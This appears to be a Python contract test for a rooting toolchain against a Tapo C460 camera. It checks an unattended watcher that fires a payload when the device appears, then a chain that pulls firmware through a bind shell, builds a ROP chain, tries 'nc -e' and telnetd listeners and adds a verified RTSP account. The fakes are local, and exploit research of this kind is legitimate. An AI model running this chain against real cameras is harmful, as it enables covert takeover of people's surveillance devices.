#!/usr/bin/env python3
"""Contract test for the C460 fire watcher and the post-shell chain (fss-tapo-460-root-zhhtf).

Two properties decide whether the armed shot is safe to leave running unattended, and both are
tested here without hardware:

  presence + one-shot   the watcher must fire only on ARP-resolved-by-MAC AND ICMP (a dozing unit
                        keeps an ARP entry and serves nothing), exactly once per boot, and it must
                        find the unit after DHCP moved it.
  chain order           the shell is one-shot, so the artifacts that only root can give are pulled
                        before anything can restart the crashed process; the ROP is installed from
                        the unit's own /bin/main before the RTSP writes; the RTSP account is then
                        *verified*, not assumed.

  python3 tests/c460_fire_test.py
"""
import os
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.join(HERE, "..", "deliverables", "scripts")
FIRE = os.path.join(SCRIPTS, "c460_fire.sh")
POST = os.path.join(SCRIPTS, "c460_postshell.sh")
MAC = "50:3d:d1:e3:e2:07"

FAILURES = []


def check(name, cond, detail=""):
    print("  [%s] %s%s" % ("ok " if cond else "FAIL", name,
                           " — %s" % detail if detail and not cond else ""))
    if not cond:
        FAILURES.append(name)


def exe(path, body):
    open(path, "w").write(body)
    os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR)
    return path


def arp_fixture(td, mac, ip, complete=True):
    """One line in the census form the resolver parses (`arp -an`)."""
    p = os.path.join(td, "arp.txt")
    entry = "? (%s) at %s on en1 ifscope [ethernet]" % (ip, mac)
    if not complete:
        entry = "? (%s) at (incomplete) on en1 ifscope [ethernet]" % ip
    open(p, "w").write("? (192.168.4.1) at 48:dd:0c:c9:ec:0d on en1 ifscope [ethernet]\n"
                       + entry + "\n")
    return p


def run_fire(td, arp_file, guard, postshell, deadline="0", extra_env=None):
    env = dict(os.environ)
    env.update({
        "MAC": MAC, "ADDR": "0xbef8b000", "OFFSET": "1060",
        "LOG": os.path.join(td, "fire.log"), "STATE": os.path.join(td, "fire.state"),
        "POLL": "0.1", "GUARD_GAP": "0", "WATCH_DEADLINE": deadline,
        "ARP_CMD": "cat " + arp_file, "PING": "true",
        "GUARD": guard, "POSTSHELL": postshell, "PY": sys.executable,
    })
    env.update(extra_env or {})
    return subprocess.run(["bash", FIRE], capture_output=True, text=True, timeout=30, env=env)


def test_presence_and_one_shot(td):
    print("watcher: MAC presence, one shot, hang-hit address:")
    calls = os.path.join(td, "guard.calls")
    post = os.path.join(td, "post.calls")
    guard = exe(os.path.join(td, "guard.py"), r"""#!/usr/bin/env python3
import sys
open(%r, "a").write(" ".join(sys.argv[1:]) + "\n")
print("SHELL on 192.168.4.33:4444")
""" % calls)
    postshell = exe(os.path.join(td, "post.sh"), "#!/bin/bash\necho \"$1\" >> %s\n" % post)

    # incomplete entry for the same MAC is NOT presence
    r = run_fire(td, arp_fixture(td, MAC, "192.168.4.33", complete=False), guard, postshell,
                 deadline="0.03")
    check("incomplete ARP entry holds fire", r.returncode == 4, "rc=%d %s" % (r.returncode, r.stdout))
    check("no payload on an incomplete entry", not os.path.exists(calls))

    # DHCP moved the unit: the watcher must follow the MAC, not a remembered IP
    r = run_fire(td, arp_fixture(td, MAC, "192.168.4.77"), guard, postshell)
    check("fires once on ARP+ICMP", r.returncode == 0, "rc=%d %s" % (r.returncode, r.stdout))
    lines = open(calls).read().splitlines() if os.path.exists(calls) else []
    check("exactly one payload", len(lines) == 1, repr(lines))
    check("payload targets the MAC-resolved address",
          bool(lines) and "--host 192.168.4.77" in lines[0], repr(lines))
    check("payload uses the hang-hit address and offset",
          bool(lines) and "--addr 0xbef8b000" in lines[0] and "--offset 1060" in lines[0],
          repr(lines))
    check("state records the shell", "shell" in open(os.path.join(td, "fire.state")).read())
    check("post-shell chain ran with that address",
          os.path.exists(post) and open(post).read().strip() == "192.168.4.77")

    r = run_fire(td, arp_fixture(td, MAC, "192.168.4.77"), guard, postshell)
    check("a restart does not re-fire", r.returncode == 3, "rc=%d" % r.returncode)
    check("still exactly one payload", len(open(calls).read().splitlines()) == 1)

    r = run_fire(td, arp_fixture(td, MAC, "192.168.4.77"), guard, postshell,
                 extra_env={"FORCE": "1"})
    check("FORCE re-arms after a real power cycle", r.returncode == 0
          and len(open(calls).read().splitlines()) == 2)


class FakeShell:
    """Accept :4444 the way the bind shell does: one accept, then answer line-wise."""

    def __init__(self, once=False):
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.port = self.srv.getsockname()[1]
        self.srv.listen(8)
        self.stop = False
        self.once = once
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        served = 0
        while not self.stop:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            c.sendall(b"$ ")
            c.close()
            served += 1
            if self.once and served >= 1:
                # the real bind shell *becomes* /bin/sh: after one accept nothing listens
                self.srv.close()
                return

    def close(self):
        self.stop = True
        self.srv.close()


def test_chain_order(td):
    print("post-shell chain: order, arguments, verification:")
    shell = FakeShell()
    outdir = os.path.join(td, "pane")
    order = os.path.join(td, "order")
    payload = os.path.join(td, "bin_main")

    post = exe(os.path.join(td, "post.py"), r"""#!/usr/bin/env python3
import os, sys
args = sys.argv[1:]
out = os.environ["OUTDIR"]
open(os.environ["ORDER"], "a").write("post %s\n" % " ".join(args))
if "--pull" in args:
    open(os.path.join(out, "proc_mtd"), "w").write("mtd0: 00040000 00010000\n")
    open(os.path.join(out, "bin_main"), "wb").write(b"\x7fELF" + b"\0" * 64)
elif "--rtsp-verify" in args:
    print("554 DESCRIBE 200")
sys.exit(0)
""")
    chain = exe(os.path.join(td, "chain.py"), r"""#!/usr/bin/env python3
import sys
print("tapo_connectap_rop.py <host> --offset 0x424 --pop 0x20004 --pivot 0xe1080 --system 0x1b468")
""")
    rop = exe(os.path.join(td, "rop.py"), r"""#!/usr/bin/env python3
import os, sys
open(os.environ["ORDER"], "a").write("rop %s\n" % " ".join(sys.argv[1:]))
""")

    env = dict(os.environ)
    env.update({"OUTDIR": outdir, "ORDER": order, "SHELL_PORT": str(shell.port),
                "WAIT": "10", "CHAIN": chain, "POST_TOOL": post, "ROP_TOOL": rop,
                "PY": sys.executable, "OBJDUMP": "true", "RTSP_WAIT": "0"})
    r = subprocess.run(["bash", POST, "127.0.0.1"], capture_output=True, text=True,
                       timeout=60, env=env)
    shell.close()

    check("chain completes", r.returncode == 0, "rc=%d %s" % (r.returncode, r.stdout[-400:]))
    steps = [ln.split()[0] for ln in open(order).read().splitlines()]
    check("pull precedes the ROP", steps[:2] == ["post", "rop"], repr(steps))
    check("RTSP writes come after the ROP", steps[-2:] == ["post", "post"], repr(steps))
    check("pull ran before any derivation", "--pull" in open(order).read().splitlines()[0])
    rop_args = [ln for ln in open(order).read().splitlines() if ln.startswith("rop")][0]
    for want in ("--offset 0x424", "--pop 0x20004", "--pivot 0xe1080", "--system 0x1b468"):
        check("ROP carries %s" % want, want in rop_args, rop_args)
    cred = open(os.path.join(outdir, "rtsp_cred.txt")).read().split()
    check("credential stored once", len(cred) == 2 and cred[0] == "fssuser", repr(cred))
    verify = [ln for ln in open(order).read().splitlines() if "--rtsp-verify" in ln][0]
    check("verification uses the stored password", cred[1] in verify, verify)


def test_chain_real_derivation(td):
    """The chain step must work on real disassembly, not only on a canned argument line."""
    print("post-shell chain: real find_chain over a synthetic ARM /bin/main:")
    try:
        import tapo_gadget_test as gadget
    except ImportError:
        check("gadget fixture importable", False)
        return
    if not (gadget.AS and gadget.LD):
        print("  [skip] arm-none-eabi binutils not installed")
        return
    elf = gadget.build_fixture(td)
    shell = FakeShell()
    outdir = os.path.join(td, "pane3")
    order = os.path.join(td, "order3")
    blob = open(elf, "rb").read()
    post = exe(os.path.join(td, "post3.py"), r"""#!/usr/bin/env python3
import os, sys
open(os.environ["ORDER"], "a").write("post\n")
if "--pull" in sys.argv:
    open(os.path.join(os.environ["OUTDIR"], "proc_mtd"), "w").write("mtd0: 00040000 00010000\n")
    open(os.path.join(os.environ["OUTDIR"], "bin_main"), "wb").write(%r)
""" % blob)
    rop = exe(os.path.join(td, "rop3.py"), r"""#!/usr/bin/env python3
import os, sys
open(os.environ["ORDER"], "a").write("rop %s\n" % " ".join(sys.argv[1:]))
""")
    env = dict(os.environ)
    env.update({"OUTDIR": outdir, "ORDER": order, "SHELL_PORT": str(shell.port), "WAIT": "10",
                "POST_TOOL": post, "ROP_TOOL": rop, "PY": sys.executable})
    r = subprocess.run(["bash", POST, "127.0.0.1", "--skip-rtsp"], capture_output=True,
                       text=True, timeout=60, env=env)
    shell.close()
    check("real derivation reaches the ROP", r.returncode == 0,
          "rc=%d %s" % (r.returncode, r.stdout[-300:]))
    lines = [ln for ln in open(order).read().splitlines() if ln.startswith("rop")]
    args = lines[0] if lines else ""
    for want in ("--offset", "--pop", "--pivot", "--system"):
        check("derived %s" % want, want in args, args)
    check("no NOT FOUND placeholder", "NOT" not in args, args)


def test_chain_empty_pull(td):
    print("post-shell chain: an empty pull stops before the ROP:")
    shell = FakeShell()
    outdir = os.path.join(td, "pane2")
    order = os.path.join(td, "order2")
    post = exe(os.path.join(td, "post2.py"), r"""#!/usr/bin/env python3
import os, sys
open(os.environ["ORDER"], "a").write("post\n")
if "--pull" in sys.argv:
    open(os.path.join(os.environ["OUTDIR"], "proc_mtd"), "w").write("x\\n")
""")
    rop = exe(os.path.join(td, "rop2.py"), r"""#!/usr/bin/env python3
open(__import__("os").environ["ORDER"], "a").write("rop\\n")
""")
    env = dict(os.environ)
    env.update({"OUTDIR": outdir, "ORDER": order, "SHELL_PORT": str(shell.port), "WAIT": "10",
                "CHAIN": "/bin/true", "POST_TOOL": post, "ROP_TOOL": rop, "PY": sys.executable})
    r = subprocess.run(["bash", POST, "127.0.0.1"], capture_output=True, text=True,
                       timeout=60, env=env)
    shell.close()
    check("empty /bin/main exits 2", r.returncode == 2, "rc=%d" % r.returncode)
    check("no ROP on an empty pull", "rop" not in open(order).read())


def test_rtsp_probe_retry(td, succeed):
    """554 comes up a beat after the unit returns; the probe retries, the final verdict decides."""
    label = "verification retries until 554 answers" if succeed else "verification gives up bounded"
    print("post-shell chain: %s:" % label)
    shell = FakeShell()
    outdir = os.path.join(td, "pane4")
    order = os.path.join(td, "order4")
    counter = os.path.join(td, "verify.calls")
    post = exe(os.path.join(td, "post4.py"), r"""#!/usr/bin/env python3
import os, sys
args = sys.argv[1:]
out = os.environ["OUTDIR"]
open(os.environ["ORDER"], "a").write("post %s\n" % " ".join(args))
if "--pull" in args:
    open(os.path.join(out, "proc_mtd"), "w").write("mtd0: 00040000 00010000\n")
    open(os.path.join(out, "bin_main"), "wb").write(b"\x7fELF" + b"\0" * 64)
elif "--rtsp-verify" in args:
    n = int(open(os.environ["COUNTER"]).read() or 0) + 1 if os.path.exists(os.environ["COUNTER"]) else 1
    open(os.environ["COUNTER"], "w").write(str(n))
    # closed for the first two attempts, then serving (or never, when succeed is False)
    sys.exit(0 if __SUCCEED__ and n >= 3 else 1)
""".replace("__SUCCEED__", repr(succeed)))
    chain = exe(os.path.join(td, "chain4.py"), r"""#!/usr/bin/env python3
print("tapo_connectap_rop.py <host> --offset 0x424 --pop 0x1 --pivot 0x2 --system 0x3")
""")
    rop = exe(os.path.join(td, "rop4.py"), "#!/usr/bin/env python3\n")

    env = dict(os.environ)
    env.update({"OUTDIR": outdir, "ORDER": order, "COUNTER": counter,
                "SHELL_PORT": str(shell.port), "WAIT": "10", "CHAIN": chain,
                "POST_TOOL": post, "ROP_TOOL": rop, "PY": sys.executable,
                "OBJDUMP": "true", "RTSP_WAIT": "0",
                "RTSP_PROBE_TRIES": "4", "RTSP_PROBE_GAP": "0"})
    r = subprocess.run(["bash", POST, "127.0.0.1"], capture_output=True, text=True,
                       timeout=60, env=env)
    shell.close()
    calls = int(open(counter).read()) if os.path.exists(counter) else 0
    if succeed:
        check("retry reaches a serving verdict", r.returncode == 0,
              "rc=%d %s" % (r.returncode, r.stdout[-300:]))
        check("stopped probing once it answered", calls == 3, "calls=%d" % calls)
    else:
        check("bounded retry exits 6", r.returncode == 6, "rc=%d %s" % (r.returncode, r.stdout[-300:]))
        check("probe count is capped by RTSP_PROBE_TRIES", calls == 4, "calls=%d" % calls)
    check("retry logged", "not serving yet" in r.stdout if succeed else "after 4 attempts" in r.stdout,
          r.stdout[-300:])


def test_shell_fallback(td):
    """A candidate that yields no listener must not end the chain while another can still work."""
    print("post-shell chain: repeatable-shell candidates are tried until one listens:")
    shell = FakeShell(once=True)          # the bind shell really is one-shot
    outdir = os.path.join(td, "pane5")
    order = os.path.join(td, "order5")
    pids = os.path.join(td, "listener.pid")
    listener = exe(os.path.join(td, "listen.py"), r"""#!/usr/bin/env python3
import socket, sys
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", int(sys.argv[1]))); s.listen(8)
while True:
    c, _ = s.accept(); c.sendall(b"$ "); c.close()
""")
    post = exe(os.path.join(td, "post5.py"), r"""#!/usr/bin/env python3
import os, sys
args = sys.argv[1:]
out = os.environ["OUTDIR"]
open(os.environ["ORDER"], "a").write("post %s\n" % " ".join(args))
if "--pull" in args:
    open(os.path.join(out, "proc_mtd"), "w").write("mtd0: 00040000 00010000\n")
    open(os.path.join(out, "bin_main"), "wb").write(b"\x7fELF" + b"\0" * 64)
""")
    rop = exe(os.path.join(td, "rop5.py"), r"""#!/usr/bin/env python3
import os, subprocess, sys
cmd = sys.argv[sys.argv.index("--cmd") + 1]
open(os.environ["ORDER"], "a").write("rop %s\n" % cmd)
# only the telnetd shape binds; the nc -e shape is dead (as it may be on the device)
if "telnetd" in cmd and not os.path.exists(os.environ["PIDS"]):
    p = subprocess.Popen([sys.executable, os.environ["LISTENER"], os.environ["SHELL_PORT"]],
                         start_new_session=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    open(os.environ["PIDS"], "w").write(str(p.pid))
""")
    chain = exe(os.path.join(td, "chain5.py"), r"""#!/usr/bin/env python3
print("tapo_connectap_rop.py <host> --offset 0x424 --pop 0x1 --pivot 0x2 --system 0x3")
""")
    env = dict(os.environ)
    env.update({"OUTDIR": outdir, "ORDER": order, "PIDS": pids, "LISTENER": listener,
                "SHELL_PORT": str(shell.port), "WAIT": "5", "ROP_WAIT": "2",
                "CHAIN": chain, "POST_TOOL": post, "ROP_TOOL": rop, "PY": sys.executable,
                "OBJDUMP": "true"})
    r = subprocess.run(["bash", POST, "127.0.0.1", "--skip-rtsp"], capture_output=True,
                       text=True, timeout=120, env=env)
    try:
        if os.path.exists(pids):
            os.kill(int(open(pids).read()), 15)
    except OSError:
        pass
    shell.close()
    cmds = [ln for ln in open(order).read().splitlines() if ln.startswith("rop")]
    check("chain survives a dead candidate and reaches SERVING", r.returncode == 0,
          "rc=%d %s" % (r.returncode, r.stdout[-300:]))
    check("first candidate is nc -e", len(cmds) >= 1 and "nc -lk" in cmds[0], repr(cmds))
    check("second candidate is telnetd", len(cmds) >= 2 and "telnetd" in cmds[1], repr(cmds))
    check("stops once a shape listens", len(cmds) == 2, repr(cmds))
    check("the chosen shape is logged", "via:" in r.stdout, r.stdout[-300:])
    check("pull happened before the ROPs",
          open(order).read().splitlines()[0].startswith("post") and
          all(ln.startswith("rop") for ln in open(order).read().splitlines()[1:]))


def main():
    for name, fn in (("presence/one-shot", test_presence_and_one_shot),
                     ("chain order", test_chain_order),
                     ("real derivation", test_chain_real_derivation),
                     ("empty pull", test_chain_empty_pull),
                     ("probe retry", lambda td: test_rtsp_probe_retry(td, True)),
                     ("probe retry bounded", lambda td: test_rtsp_probe_retry(td, False)),
                     ("shell fallback", test_shell_fallback)):
        with tempfile.TemporaryDirectory() as td:
            try:
                fn(td)
            except Exception as exc:  # a harness error is a failure, not a pass
                check("%s raised" % name, False, repr(exc))
    print("\n%d failure(s)" % len(FAILURES))
    return 1 if FAILURES else 0


if __name__ == "__main__":
    sys.exit(main())
